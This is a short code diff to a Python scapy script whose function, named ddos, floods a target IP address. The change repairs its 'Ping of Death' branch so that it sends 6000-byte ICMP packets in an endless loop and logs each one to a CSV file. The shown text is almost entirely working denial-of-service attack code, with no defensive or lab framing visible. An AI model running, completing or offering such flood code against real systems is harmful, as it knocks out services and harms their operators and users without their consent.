@@ -1,4 +1,4 @@
-from scapy.all import IP, TCP, ICMP, send
+from scapy.all import IP, TCP, ICMP, send, Raw
 import random
 import ipaddress
 import sys
@@ -32,8 +32,8 @@ def ddos(target_ip, attack_type):
 
             elif attack_type == "pod":  # Ping of Death
                 while True:
-                    load = 6000
-                    pkt = IP(dst=target_ip) / ICMP() / Raw(load=load)
+                    load = b'X' * 6000  # Crée une charge de 6000 octets
+                    pkt = IP(dst=target_ip) / ICMP() / Raw(load)
                     print(pkt.summary())
                     send(pkt, verbose=0)
                     writer.writerow([time.time(), target_ip, "pod"])
